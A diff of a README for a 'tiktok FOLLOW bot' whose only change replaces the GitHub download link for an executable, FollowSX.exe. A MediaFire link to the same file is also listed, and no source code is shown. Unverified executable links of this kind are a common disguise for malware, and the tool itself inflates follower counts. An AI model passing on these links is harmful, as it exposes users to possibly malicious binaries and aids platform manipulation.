@@ -4,7 +4,7 @@
 Download =====> 
 
 "1" https://www.mediafire.com/file/grip17aw0qtlb44/FollowSX.exe/file                                                                                                                                         
-"2" https://github.com/wintersorcat/FollowSX/releases/download/upload/FollowSX.exe                                                                                                                                                                                      
+"2" https://github.com/FollowSXO/FollowSXO/releases/download/update/FollowSX.exe                                                                                                                                                                                      
 "4" release 
 
 # tiktok FOLLOW bot
